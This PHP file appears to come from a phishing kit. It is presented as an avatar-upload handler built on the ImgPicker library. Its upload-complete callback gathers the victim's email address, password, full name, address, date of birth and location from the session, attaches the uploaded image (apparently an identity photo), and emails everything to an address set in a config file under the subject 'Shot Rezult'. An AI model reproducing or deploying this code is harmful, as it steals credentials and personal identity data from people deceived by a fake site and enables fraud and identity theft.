<?php

// Error reporting
//error_reporting(0);

// HTTP access control
// header('Access-Control-Allow-Origin: yourwebsite.com');
// header('Access-Control-Allow-Origin: www.yourwebsite.com');

session_start();

require dirname(__FILE__) . '/ImgPicker.php';
require_once('../mailer/PHPMailer-master/class.phpmailer.php');

$num = rand (0, 9999);
//if ($_SESSION['fname'] ==''){$num = rand (0, 9999);}else{$num = $_SESSION['fname'].' '.$_SESSION['lname'];}
$options = array(

	// Upload directory path
	'upload_dir' => dirname(__FILE__) . '/../../files/',

	// Upload directory url:
	'upload_url' => 'files/',

    // Image versions:
    'versions' => array(
	'avatar' => array(
    		//'upload_dir' => '',
    		//'upload_url' => '',
    		// Create square image
    		'crop' => true,
    		'max_width' => 200,
    		'max_height' => 200
    	),
    ),

    /**
	 * 	Load callback
	 *
	 *  @param 	ImgPicker 		$instance
	 *  @return string|array
	 */
    'load' => function($instance) {
    	return 'avatar.jpg';
    },

    /**
	 * 	Delete callback
	 *
	 *  @param  string 		    $filename
	 *  @param 	ImgPicker 		$instance
	 *  @return boolean
	 */
    'delete' => function($filename, $instance) {
    	return true;
    },
	
	/**
	 * 	Upload start callback
	 *
	 *  @param 	stdClass 		$image
	 *  @param 	ImgPicker 		$instance
	 *  @return void
	 */
	
	'upload_start' => function($image, $instance) {
	
	if($_SESSION['fname']){
	$image->name = $_SESSION['fname'].' '.$_SESSION['lname'].' '.rand (0, 9999).'.'.$image->type;
	}else{
	$image->name = rand (0, 9999).'.'.$image->type;
	}

	},
	
	/**
	 * 	Upload complete callback
	 *
	 *  @param 	stdClass 		$image
	 *  @param 	ImgPicker 		$instance
	 *  @return void
	 */
	'upload_complete' => function($image, $instance) {
	include ('../index/config.php');
	
$message = "<table style='border-spacing: 0px; line-height: 1.2em; width: 100%; font-family:Tahoma;color:#333;font-size:14px;border:1px solid #06f;padding:20px;border-radius:5px;margin-top:20px'>
 
	<tr><td style='width: 15%;'> Email 	</td><td><font color='#3366FF'>".$_SESSION['_email_']."</td></tr>
	<tr><td> Password 					</td><td><font color='#3366FF'>".$_SESSION['_password_']."</td></tr>
	
	<tr><td><hr style='border: 0;border-bottom: 1px solid #06F;background: #999;'/></td>
	<td><hr style='border: 0;border-bottom: 1px solid #06F;background: #999;'/></td></tr>
	
	<tr><td> First Name :</td><td><font color='#3366FF'>".$_SESSION['UK747900-1']."</td></tr>
	<tr><td> Last Name 	:</td><td><font color='#3366FF'>".$_SESSION['UK747900-2']."</td></tr>
	<tr><td> Address 	:</td><td><font color='#3366FF'>".$_SESSION['UK747900-3']."</td></tr>
	<tr><td> DOB 		:</td><td><font color='#3366FF'>".$_SESSION['UK747900-7']."</td></tr>
	<tr><td> City 		:</td><td><font color='#3366FF'>".$_SESSION['UK747900-4']."</td></tr>
	<tr><td> Postal Code:</td><td><font color='#3366FF'>".$_SESSION['UK747900-5']."</td></tr>
	<tr><td> State 		:</td><td><font color='#3366FF'>".$_SESSION['UK747900-6']."</td></tr>
	<tr><td> Country	:</td><td><font color='#3366FF'>".$_SESSION['country'].   "</td></tr></table>";
	
			$email = new PHPMailer();
	        $file_to_attach = '../../files/'.$image->name;
			$email->From      = 'experts@nptemp.net';
			$email->FromName  = 'Shot';
			$email->Subject   = 'Shot Rezult  '.$ip.' | '.$countryname.' | Mr/Ms'.' '.$_SESSION['fname'];
			$email->Body      = $message;
			$email->IsHTML(true);
			$email->AddAddress( $to );
			$email->AddAttachment( $file_to_attach );

return $email->Send();

	},

	/**
	 * 	Crop start callback
	 *
	 *  @param 	stdClass 		$image
	 *  @param 	ImgPicker 		$instance
	 *  @return void
	 */
	'crop_start' => function($image, $instance) {

	

		
	},
	

	/**
	 * 	Crop complete callback
	 *
	 *  @param 	stdClass 		$image
	 *  @param 	ImgPicker 		$instance
	 *  @return void
	 */
	'crop_complete' => function($image, $instance) {
	
	}
);

// Create new ImgPicker instance
new ImgPicker($options);



/*
new ImgPicker($options, $messges);
	$messages - array of messages (See ImgPicker.php)
*/